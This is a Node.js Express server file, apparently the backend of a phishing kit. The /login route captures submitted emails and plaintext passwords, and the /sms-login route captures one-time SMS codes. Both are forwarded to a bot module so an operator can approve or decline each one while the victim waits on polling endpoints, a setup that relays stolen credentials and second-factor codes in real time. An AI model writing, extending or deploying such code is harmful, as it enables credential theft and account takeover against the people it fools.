const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");
const {
    sendApprovalRequest,
    sendApprovalRequestGeneric,
    sendApprovalRequestSMS,
} = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

// Pending items storage
let pendingLogins = {}; // { email: { password, status } }
let pendingGenerics = {}; // { identifier: status }
let pendingSMS = {}; // { code: status }

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"));

// Health check
app.get("/", (req, res) => res.send("✅ Server is running."));

// ----- LOGIN ROUTES -----
app.post("/login", (req, res) => {
    const email = req.body.email.trim().toLowerCase();
    const password = req.body.password;
    pendingLogins[email] = { password, status: "pending" };

    sendApprovalRequest(email, password);
    res.json({ success: true });
});

app.get("/check-login-status", (req, res) => {
    const email = (req.query.email || "").trim().toLowerCase();
    const status = pendingLogins[email] ? pendingLogins[email].status : "unknown";
    res.json({ status });
});

// ----- GENERIC APPROVAL ROUTES -----
app.post("/generic", (req, res) => {
    const identifier = req.body.identifier.trim();
    pendingGenerics[identifier] = "pending";

    sendApprovalRequestGeneric(identifier);
    res.json({ success: true });
});

app.get("/check-generic-status", (req, res) => {
    const identifier = (req.query.identifier || "").trim();
    const status = pendingGenerics[identifier] || "unknown";
    res.json({ status });
});

// ----- SMS CODE ROUTES -----
app.post("/sms-login", (req, res) => {
    const code = (req.body.code || "").trim();
    if (!code) return res.status(400).json({ success: false, message: "Code required" });

    pendingSMS[code] = "pending";
    sendApprovalRequestSMS(code);
    res.json({ success: true });
});

app.get("/check-sms-status", (req, res) => {
    const code = (req.query.code || "").trim();
    const status = pendingSMS[code] || "unknown";
    res.json({ status });
});

// Update approval status (called by bot)
app.post("/update-status", (req, res) => {
    const { type, value, status } = req.body;

    if (!type || !value || !status)
        return res.status(400).json({ error: "Missing data" });

    if (type === "login" && pendingLogins[value]) pendingLogins[value].status = status;
    else if (type === "sms" && pendingSMS[value]) pendingSMS[value] = status;
    else if (type === "generic" && pendingGenerics[value]) pendingGenerics[value] = status;
    else return res.status(404).json({ error: "Item not found" });

    console.log(`✅ ${type} ${value} marked as ${status}`);
    res.json({ success: true });
});

// Self-ping to stay awake
setInterval(() => {
    if (process.env.APP_URL) {
        fetch(process.env.APP_URL).catch(err => console.error("⚠️ Ping failed:", err));
    }
}, 30 * 1000);

app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
